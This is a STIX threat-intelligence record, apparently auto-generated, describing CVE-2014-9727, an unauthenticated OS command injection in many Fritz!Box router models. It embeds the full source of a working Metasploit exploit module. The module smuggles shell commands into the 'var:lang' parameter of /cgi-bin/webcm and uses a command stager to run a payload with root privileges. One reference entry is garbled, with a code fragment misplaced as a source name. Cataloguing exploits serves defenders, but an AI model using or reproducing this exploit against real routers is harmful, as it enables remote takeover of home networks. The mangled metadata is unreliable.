{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b58990a9-144d-4bdf-a242-8fc9fabf9522",
    "created": "2024-08-14T17:03:58.795713Z",
    "modified": "2024-08-14T17:03:58.795717Z",
    "name": "Fritz!Box Webcm Unauthenticated Command Injection",
    "description": " Different Fritz!Box devices are vulnerable to an unauthenticated OS command injection. This module was tested on a Fritz!Box 7270 from the LAN side. The vendor reported the following devices vulnerable: 7570, 7490, 7390, 7360, 7340, 7330, 7272, 7270 7170 Annex A A/CH, 7170 Annex B English, 7170 Annex A English, 7140, 7113, 6840 LTE 6810 LTE, 6360 Cable, 6320 Cable, 5124, 5113, 3390, 3370, 3272, 3270 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/fritzbox_echo_exec.rb",
            "external_id": "fritzbox_echo_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9727"
        },
        {
            "source_name": "reference",
            "url": "http://breaking.systems/blog/2014/04/avm-fritzbox-root-rce-from-patch-to-metasploit-module-ii#writeupwithPoC"
        },
        {
            "source_name": "fail_with(Failure::Unknown",
            "external_id": "\"#{peer}-FailedtoaccessthevulnerableURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Fritz!Box Webcm Unauthenticated Command Injection',\n      'Description' => %q{\n        Different Fritz!Box devices are vulnerable to an unauthenticated OS command injection.\n        This module was tested on a Fritz!Box 7270 from the LAN side. The vendor reported the\n        following devices vulnerable: 7570, 7490, 7390, 7360, 7340, 7330, 7272, 7270,\n        7170 Annex A A/CH, 7170 Annex B English, 7170 Annex A English, 7140, 7113, 6840 LTE,\n        6810 LTE, 6360 Cable, 6320 Cable, 5124, 5113, 3390, 3370, 3272, 3270\n      },\n      'Author'      =>\n        [\n          'Unknown', # Vulnerability discovery\n          'Fabian Braeunlein <fabian[at]breaking.systems>', # Metasploit PoC with wget method\n          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2014-9727' ],\n          [ 'OSVDB', '103289' ],\n          [ 'BID', '65520' ],\n          [ 'URL', 'http://www.kapple.de/?p=75' ],                       # vulnerability details with PoC\n          [ 'URL', 'https://www.speckmarschall.de/hoere.htm' ],          # probably the first published details (now censored)\n          [ 'URL', 'http://pastebin.com/GnMKGmZ2' ],                     # published details uncensored from speckmarschall\n          [ 'URL', 'http://www.avm.de/en/Sicherheit/update_list.html' ], # vendor site with a list of vulnerable devices\n          [ 'URL', 'http://breaking.systems/blog/2014/04/avm-fritzbox-root-rce-from-patch-to-metasploit-module-ii' ] # writeup with PoC\n        ],\n      'DisclosureDate' => '2014-02-11',\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets' =>\n        [\n          [ 'MIPS Little Endian',\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSLE\n            }\n          ],\n          [ 'MIPS Big Endian',\n            {\n              'Platform' => 'linux',\n              'Arch'     => ARCH_MIPSBE\n            }\n          ],\n        ],\n      'DefaultTarget'    => 0\n      ))\n      deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    begin\n      clue = Rex::Text::rand_text_alpha(rand(5) + 5)\n\n      res = send_request_cgi({\n        'uri'    => '/cgi-bin/webcm',\n        'method'  => 'GET',\n        'vars_get' => {\n          \"var:lang\" => \"&echo -e \\\"\\\\n\\\\n#{clue}\\\"\"\n        }\n      })\n      if res && res.body =~ /#{clue}/\n        return Exploit::CheckCode::Vulnerable\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def execute_command(cmd, opts)\n    begin\n      res = send_request_cgi({\n        'uri'    => '/cgi-bin/webcm',\n        'method' => 'GET',\n        'vars_get' => {\n          \"var:lang\" => \"&#{cmd}\",\n        }\n      })\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\n\n  def exploit\n    print_status(\"Trying to access the vulnerable URL...\")\n\n    unless check == Exploit::CheckCode::Vulnerable\n      fail_with(Failure::Unknown, \"#{peer} - Failed to access the vulnerable URL\")\n    end\n\n    print_status(\"Exploiting...\")\n    execute_cmdstager(\n      flavor: :echo,\n      linemax: 92\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-11",
    "x_mitre_platforms": [
        "linux'"
    ]
}